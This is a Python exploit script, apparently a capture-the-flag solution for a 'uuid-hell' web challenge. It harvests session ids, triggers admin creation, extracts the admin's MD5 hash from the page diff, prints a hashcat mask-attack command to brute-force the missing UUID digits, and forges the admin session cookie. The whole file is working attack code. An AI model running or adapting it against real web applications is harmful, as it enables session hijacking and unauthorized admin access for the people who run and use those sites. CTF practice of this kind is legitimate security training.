URL = "https://uuid-hell.lac.tf"
DOMAIN = "uuid-hell.lac.tf"

import requests
s = requests.Session()
id = None
origcontent = "f" * 30
while (origcontent[23:24] == 'f' or origcontent[23:24] == 'e'):
    s.cookies.clear()
    origreq = s.get(URL)
    id = origreq.cookies['id']
    origcontent = origreq.text



s.post(URL + "/createadmin")
content = s.get(URL).text

diff = ""
print(origcontent)
print(content)
for i in range(len(origcontent)):
    if not (origcontent[i] == content[i]):
        diff = content[i+7:i+39:1]
        break


hashmask = "admin" + id[0:2] + "?h?h?h?h?h?h" + id[8:]

print("Run this command on something, NOT ON MACOS:")
print("echo '" + diff + "' > hash.txt && hashcat --potfile-disable -m 0 -a 3 hash.txt '" + hashmask + "'")
admin = input("Type cracked hash value here: ")[5:]

s.cookies.set("id", admin, domain=DOMAIN)

print(s.get(URL).text)
